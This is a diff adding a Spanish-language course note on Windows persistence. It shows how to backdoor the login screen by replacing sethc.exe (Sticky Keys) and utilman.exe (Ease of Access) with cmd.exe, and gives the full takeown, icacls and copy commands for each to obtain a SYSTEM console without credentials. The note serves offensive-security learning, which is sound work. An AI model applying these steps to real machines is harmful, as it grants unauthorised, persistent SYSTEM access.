@@ -3,3 +3,75 @@ layout: apunte
 title: "7. Backdooring the Login Screen - RDP"
 ---
 
+Si tenemos acceso físico a la máquina (O RDP en nuestro caso), podemos hacer un backdoor en la pestaña de login para acceder a la terminar sin tener credenciales válidas para la máquina.
+
+Veremos dos métodos que dependen de las funcionalidades de accesibilidad para este fin.
+
+---------------------------------------
+<h2>Sticky Keys</h2>
+Cuando presionamos combinaciones de teclas como `CTRL + ALT + DEL`, podemos configurar Windows para usar teclas pegajosas, lo que nos permite presionar botones de una combinación secuencialmente en lugar de todas al mismo tiempo. En este sentido, si las sticky keys están activas, podemos presionar y soltar `CTRL`, después `ALT` y luego `DEL` para conseguir el mismo efecto.
+
+Para establecer persistencia usando las Sticky Keys, abusaremos un atajo habilitado por defecto en cualquier instalación de Windows que nos permita activar Sticky Keys presionando `SHIFT` 5 veces. Después de introducir el atajo, deberíamos ser presentados con una pantalla que se ve así:
+
+!**Pasted image 20260705155744.png**
+
+Después de presionar `SHIFT` 5 veces, Windows ejecutará el binario en `C:\Windows\System32\sethc.exe`. Si somos capaces de reemplazar dicho binario por un payload de nuestra preferencia, podemos disparar el atajo. Interesantemente, podemos incluso hacer esto desde la pantalla de login incluso antes de introducir credenciales.
+
+Una forma directa de hacerlo consiste en reemplazar `sethc.exe` con una copia de `cmd.exe`. De esta manera, podemos spawnear una consola usando el atajo de sticky keys incluso desde la pestaña de login.
+
+Para sobrescribir `sethc.exe`, primero necesitamos tomar control del archivo y otorgar a nuestro usuario actual permiso para modificarlo. Sólo entonces podremos reemplazarlo con una copia de `cmd.exe`. Para ello, podemos usar los comandos:
+
+```batch
+C:\> takeown /f c:\Windows\System32\sethc.exe
+
+SUCCESS: The file (or folder): "c:\Windows\System32\sethc.exe" now owned by user "PURECHAOS\Administrator".
+
+C:\> icacls C:\Windows\System32\sethc.exe /grant Administrator:F
+processed file: C:\Windows\System32\sethc.exe
+Successfully processed 1 files; Failed processing 0 files
+
+C:\> copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
+Overwrite C:\Windows\System32\sethc.exe? (Yes/No/All): yes
+        1 file(s) copied.
+```
+
+Después de hacer eso, le damos a `Lock`:
+
+!**Pasted image 20260705160614.png**
+
+Y ahora deberíamos poder darle a `SHIFT` 5 veces para acceder a una terminal con privilegios SYSTEM.
+
+!**Pasted image 20260705160643.png**
+
+----------------------------------------
+<h2>Utilman</h2>
+Utilman es una aplicación integrada de Windows que se usa para ofrecer facilidad de acceso a opciones durante el menú de bloqueo:
+
+!**Pasted image 20260705160729.png**
+
+Cuando hacemos click en el botón de facilidad de acceso, ejecuta `C:\Windows\System32\Utilman.exe` con privilegios SYSTEM. Si lo reemplazamos con una copia de `cmd.exe`, podemos bypassear la pantalla de login de nuevo.
+
+Para reemplazar `utilman.exe`, podemos hacer un proceso similar a lo que hicimos con `sethc.exe`:
+
+```batch
+C:\> takeown /f c:\Windows\System32\utilman.exe
+
+SUCCESS: The file (or folder): "c:\Windows\System32\utilman.exe" now owned by user "PURECHAOS\Administrator".
+
+C:\> icacls C:\Windows\System32\utilman.exe /grant Administrator:F
+processed file: C:\Windows\System32\utilman.exe
+Successfully processed 1 files; Failed processing 0 files
+
+C:\> copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
+Overwrite C:\Windows\System32\utilman.exe? (Yes/No/All): yes
+        1 file(s) copied.
+```
+
+Para dispararlo, le damos a `Lock`:
+
+!**Pasted image 20260705160943.png**
+
+Y finalmente procedemos a hacer click en "Ease of Access".
+
+!**Pasted image 20260705161007.png**
+
